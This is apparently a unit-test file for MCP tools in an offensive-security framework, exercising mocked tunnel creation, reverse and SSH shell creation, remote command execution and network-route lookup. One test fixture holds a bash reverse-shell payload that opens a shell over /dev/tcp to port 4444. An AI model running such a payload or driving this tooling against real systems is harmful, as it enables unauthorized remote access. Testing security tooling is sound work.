"""Unit tests for MCP tool integration."""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch

from amp.exceptions import (
    ShellCreationFailed,
    ShellLimitExceeded,
    ShellNotFound,
    TunnelCreationFailed,
    TunnelLimitExceeded,
    TunnelNotFound,
)
from amp.mcp.tools import context_tools, network_tools, shell_tools, tunnel_tools
from amp.storage.models import (
    OSType,
    PrivilegeLevel,
    ShellModel,
    ShellProgram,
    ShellStatus,
    ShellType,
    TunnelModel,
    TunnelStatus,
    TunnelType,
)


class TestTunnelTools:
    """Test tunnel management tools."""

    @pytest.fixture
    def mock_tunnel_manager(self):
        """Create mock tunnel manager."""
        manager = MagicMock()
        tunnel_tools.set_tunnel_manager(manager)
        return manager

    @pytest.fixture
    def sample_tunnel(self):
        """Create sample tunnel model."""
        from datetime import datetime
        return TunnelModel(
            id="tunnel-123",
            name="test-tunnel",
            tunnel_type=TunnelType.CHISEL,
            status=TunnelStatus.STOPPED,
            local_host="127.0.0.1",
            local_port=8080,
            remote_host="192.168.1.100",
            remote_port=9090,
            created_at=datetime.utcnow(),
            updated_at=datetime.utcnow(),
        )

    @pytest.mark.asyncio
    async def test_create_tunnel_success(self, mock_tunnel_manager, sample_tunnel):
        """Test successful tunnel creation."""
        mock_tunnel_manager.create_tunnel.return_value = sample_tunnel

        result = await tunnel_tools.create_tunnel(
            name="test-tunnel",
            tunnel_type="chisel",
            local_port=8080,
            remote_host="192.168.1.100",
            remote_port=9090,
        )

        assert result["success"] is True
        assert result["data"]["tunnel_id"] == "tunnel-123"
        assert result["data"]["name"] == "test-tunnel"
        assert result["data"]["tunnel_type"] == "chisel"
        mock_tunnel_manager.create_tunnel.assert_called_once()

    @pytest.mark.asyncio
    async def test_create_tunnel_limit_exceeded(self, mock_tunnel_manager):
        """Test tunnel creation with limit exceeded."""
        mock_tunnel_manager.create_tunnel.side_effect = TunnelLimitExceeded(20, 20)

        result = await tunnel_tools.create_tunnel(
            name="test-tunnel",
            tunnel_type="chisel",
            local_port=8080,
            remote_host="192.168.1.100",
            remote_port=9090,
        )

        assert result["success"] is False
        assert result["error_type"] == "limit_exceeded"

    @pytest.mark.asyncio
    async def test_create_tunnel_invalid_type(self, mock_tunnel_manager):
        """Test tunnel creation with invalid type."""
        result = await tunnel_tools.create_tunnel(
            name="test-tunnel",
            tunnel_type="invalid",
            local_port=8080,
            remote_host="192.168.1.100",
            remote_port=9090,
        )

        assert result["success"] is False
        assert result["error_type"] == "validation_error"

    @pytest.mark.asyncio
    async def test_start_tunnel_success(self, mock_tunnel_manager, sample_tunnel):
        """Test successful tunnel start."""
        sample_tunnel.status = TunnelStatus.ACTIVE
        sample_tunnel.process_pid = 12345
        mock_tunnel_manager.start_tunnel.return_value = sample_tunnel

        result = await tunnel_tools.start_tunnel("tunnel-123")

        assert result["success"] is True
        assert result["data"]["status"] == "active"
        assert result["data"]["process_pid"] == 12345

    @pytest.mark.asyncio
    async def test_start_tunnel_not_found(self, mock_tunnel_manager):
        """Test starting non-existent tunnel."""
        mock_tunnel_manager.start_tunnel.side_effect = TunnelNotFound("tunnel-123")

        result = await tunnel_tools.start_tunnel("tunnel-123")

        assert result["success"] is False
        assert result["error_type"] == "not_found"

    @pytest.mark.asyncio
    async def test_list_tunnels_all(self, mock_tunnel_manager, sample_tunnel):
        """Test listing all tunnels."""
        mock_tunnel_manager.list_all_tunnels.return_value = [sample_tunnel]

        result = await tunnel_tools.list_tunnels()

        assert result["success"] is True
        assert result["data"]["count"] == 1
        assert len(result["data"]["tunnels"]) == 1

    @pytest.mark.asyncio
    async def test_list_tunnels_filtered(self, mock_tunnel_manager, sample_tunnel):
        """Test listing tunnels with status filter."""
        sample_tunnel.status = TunnelStatus.ACTIVE
        mock_tunnel_manager.list_active_tunnels.return_value = [sample_tunnel]

        result = await tunnel_tools.list_tunnels(status="active")

        assert result["success"] is True
        assert result["data"]["count"] == 1


class TestShellTools:
    """Test shell management tools."""

    @pytest.fixture
    def mock_shell_manager(self):
        """Create mock shell manager."""
        manager = MagicMock()
        shell_tools.set_shell_manager(manager)
        return manager

    @pytest.fixture
    def sample_shell(self):
        """Create sample shell model."""
        from datetime import datetime
        return ShellModel(
            id="shell-123",
            name="test-shell",
            shell_type=ShellType.REVERSE,
            os_type=OSType.LINUX,
            shell_program=ShellProgram.BASH,
            status=ShellStatus.ACTIVE,
            target_host="192.168.1.100",
            target_port=4444,
            privilege_level=PrivilegeLevel.USER,
            created_at=datetime.utcnow(),
            updated_at=datetime.utcnow(),
        )

    @pytest.mark.asyncio
    async def test_create_reverse_shell_success(self, mock_shell_manager, sample_shell):
        """Test successful reverse shell creation."""
        payload = "bash -i >& /dev/tcp/0.0.0.0/4444 0>&1"
        mock_shell_manager.create_reverse_shell.return_value = (sample_shell, payload)

        result = await shell_tools.create_shell(
            name="test-shell",
            shell_type="reverse",
            target_host="192.168.1.100",
            local_port=4444,
        )

        assert result["success"] is True
        assert result["data"]["shell_id"] == "shell-123"
        assert "payload" in result["data"]

    @pytest.mark.asyncio
    async def test_create_shell_limit_exceeded(self, mock_shell_manager):
        """Test shell creation with limit exceeded."""
        mock_shell_manager.create_reverse_shell.side_effect = ShellLimitExceeded(50, 50)

        result = await shell_tools.create_shell(
            name="test-shell",
            shell_type="reverse",
            target_host="192.168.1.100",
            local_port=4444,
        )

        assert result["success"] is False
        assert result["error_type"] == "limit_exceeded"

    @pytest.mark.asyncio
    async def test_create_ssh_shell_success(self, mock_shell_manager, sample_shell):
        """Test successful SSH shell creation."""
        sample_shell.shell_type = ShellType.SSH
        mock_shell_manager.create_ssh_shell.return_value = sample_shell

        result = await shell_tools.create_shell(
            name="test-shell",
            shell_type="ssh",
            target_host="192.168.1.100",
            username="admin",
            password="password",
        )

        assert result["success"] is True
        assert result["data"]["shell_id"] == "shell-123"

    @pytest.mark.asyncio
    async def test_execute_command_success(self, mock_shell_manager, sample_shell):
        """Test successful command execution."""
        from amp.storage.models import ExecuteCommandResponse

        mock_shell_manager.get_shell.return_value = sample_shell
        mock_shell_manager.execute_command.return_value = ExecuteCommandResponse(
            operation_id="op-123",
            stdout="output",
            stderr="",
            exit_code=0,
            duration_ms=100,
            success=True,
        )

        result = await shell_tools.execute_command(
            shell_id="shell-123",
            command="ls -la",
        )

        assert result["success"] is True
        assert result["data"]["exit_code"] == 0
        assert result["data"]["stdout"] == "output"

    @pytest.mark.asyncio
    async def test_execute_command_shell_not_found(self, mock_shell_manager):
        """Test command execution with non-existent shell."""
        mock_shell_manager.get_shell.side_effect = ShellNotFound("shell-123")

        result = await shell_tools.execute_command(
            shell_id="shell-123",
            command="ls -la",
        )

        assert result["success"] is False
        assert result["error_type"] == "not_found"

    @pytest.mark.asyncio
    async def test_list_shells_success(self, mock_shell_manager, sample_shell):
        """Test listing shells."""
        mock_shell_manager.list_active_shells.return_value = [sample_shell]

        result = await shell_tools.list_shells()

        assert result["success"] is True
        assert result["data"]["count"] == 1
        assert len(result["data"]["shells"]) == 1


class TestContextTools:
    """Test context query tools."""

    @pytest.fixture
    def mock_similarity_search(self):
        """Create mock similarity search."""
        search = MagicMock()
        context_tools.set_context_components(search, None, None)
        return search

    @pytest.fixture
    def mock_prompt_builder(self):
        """Create mock prompt builder."""
        builder = MagicMock()
        context_tools.set_context_components(None, builder, None)
        return builder

    @pytest.mark.asyncio
    async def test_get_relevant_operations_success(self, mock_similarity_search):
        """Test getting relevant operations."""
        mock_similarity_search.find_similar_commands.return_value = [
            {
                "id": "op-1",
                "command": "ls -la",
                "stdout": "output",
                "exit_code": 0,
                "distance": 0.2,
                "metadata": {"shell_id": "shell-1", "timestamp": "2026-05-07T12:00:00"},
            }
        ]
        mock_similarity_search.rank_by_relevance.return_value = [
            {
                "id": "op-1",
                "command": "ls -la",
                "stdout": "output",
                "exit_code": 0,
                "distance": 0.2,
                "relevance_score": 0.8,
                "similarity_score": 0.8,
                "recency_score": 0.9,
                "metadata": {"shell_id": "shell-1", "timestamp": "2026-05-07T12:00:00"},
            }
        ]

        result = await context_tools.get_relevant_operations(
            query="list files",
            limit=10,
        )

        assert result["success"] is True
        assert result["data"]["count"] == 1
        assert len(result["data"]["operations"]) == 1

    @pytest.mark.asyncio
    async def test_build_prompt_success(self, mock_prompt_builder):
        """Test building prompt."""
        mock_prompt_builder.build_prompt.return_value = "# Current Task\nTest query\n"
        mock_prompt_builder.estimate_prompt_tokens.return_value = 100
        mock_prompt_builder.get_context_stats.return_value = {
            "total_operations": 10,
            "active_tunnels": 2,
            "active_shells": 3,
        }

        result = await context_tools.build_prompt(query="Test query")

        assert result["success"] is True
        assert "prompt" in result["data"]
        assert result["data"]["token_count"] == 100


class TestNetworkTools:
    """Test network topology tools."""

    @pytest.fixture
    def mock_topology_visualizer(self):
        """Create mock topology visualizer."""
        visualizer = MagicMock()
        network_tools.set_network_components(None, visualizer, None)
        return visualizer

    @pytest.fixture
    def mock_route_calculator(self):
        """Create mock route calculator."""
        calculator = MagicMock()
        network_tools.set_network_components(None, None, calculator)
        return calculator

    @pytest.mark.asyncio
    async def test_visualize_topology_mermaid(self, mock_topology_visualizer):
        """Test topology visualization in mermaid format."""
        mock_topology_visualizer.generate_mermaid.return_value = "graph LR\n  A[Node A]"

        result = await network_tools.visualize_topology(format="mermaid")

        assert result["success"] is True
        assert result["data"]["format"] == "mermaid"
        assert "graph LR" in result["data"]["content"]

    @pytest.mark.asyncio
    async def test_find_route_success(self, mock_route_calculator):
        """Test finding route between segments."""
        from amp.core.network.router import Route

        mock_route = Route(
            segments=["seg-1", "seg-2", "seg-3"],
            tunnels=["tunnel-1", "tunnel-2"],
        )
        mock_route_calculator.find_route.return_value = mock_route
        mock_route_calculator.is_route_active.return_value = True
        mock_route_calculator.get_route_metadata.return_value = {
            "source": "seg-1",
            "target": "seg-3",
            "hop_count": 2,
        }

        result = await network_tools.find_route(
            source="seg-1",
            target="seg-3",
        )

        assert result["success"] is True
        assert result["data"]["route"]["hop_count"] == 2
        assert result["data"]["route"]["source"] == "seg-1"
        assert result["data"]["route"]["target"] == "seg-3"

    @pytest.mark.asyncio
    async def test_find_route_not_found(self, mock_route_calculator):
        """Test finding route when no route exists."""
        mock_route_calculator.find_route.return_value = None

        result = await network_tools.find_route(
            source="seg-1",
            target="seg-3",
        )

        assert result["success"] is True
        assert result["data"]["route"] is None

    @pytest.mark.asyncio
    async def test_get_affected_segments_success(self, mock_route_calculator):
        """Test getting affected segments."""
        mock_route_calculator.get_affected_segments.return_value = ["seg-2", "seg-3"]

        result = await network_tools.get_affected_segments(tunnel_id="tunnel-1")

        assert result["success"] is True
        assert result["data"]["count"] == 2
        assert "seg-2" in result["data"]["affected_segment_ids"]


class TestToolResponseFormat:
    """Test that all tools return consistent response format."""

    @pytest.mark.asyncio
    async def test_tunnel_tool_response_format(self):
        """Test tunnel tool response format."""
        tunnel_tools.set_tunnel_manager(None)
        result = await tunnel_tools.create_tunnel(
            name="test",
            tunnel_type="chisel",
            local_port=8080,
            remote_host="host",
            remote_port=9090,
        )

        # Should have success field
        assert "success" in result
        assert isinstance(result["success"], bool)

        # Should have error fields when failed
        if not result["success"]:
            assert "error" in result
            assert "error_type" in result

    @pytest.mark.asyncio
    async def test_shell_tool_response_format(self):
        """Test shell tool response format."""
        shell_tools.set_shell_manager(None)
        result = await shell_tools.create_shell(
            name="test",
            shell_type="reverse",
            target_host="host",
            local_port=4444,
        )

        # Should have success field
        assert "success" in result
        assert isinstance(result["success"], bool)

        # Should have error fields when failed
        if not result["success"]:
            assert "error" in result
            assert "error_type" in result
